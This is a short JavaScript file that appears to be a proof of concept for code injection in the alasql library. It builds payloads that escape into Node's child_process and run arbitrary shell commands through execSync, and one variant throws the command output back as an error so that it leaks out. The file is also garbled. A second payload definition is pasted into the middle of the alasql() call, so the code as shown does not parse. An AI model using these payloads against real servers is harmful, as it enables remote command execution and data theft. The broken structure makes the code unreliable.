const alasql = require('alasql');

const genPayload = command => `
new Function(
    'return this.process.mainModule.require'
)()('child_process').execSync(${JSON.stringify(command)})
`;


res = alasql(
    // Initialize the database
    'CREATE table i_am_a_table;' +
    `INSERT INTO i_am_a_table VALUES (1337);` +

    const genPayload = command => `
(() => {
  const req = new Function('return this.process.mainModule.require')();
  const out = req('child_process').execSync(
    ${JSON.stringify(command)},
    { encoding: 'utf8' }
  );
  throw new Error(out.trim());
})()
`;

);
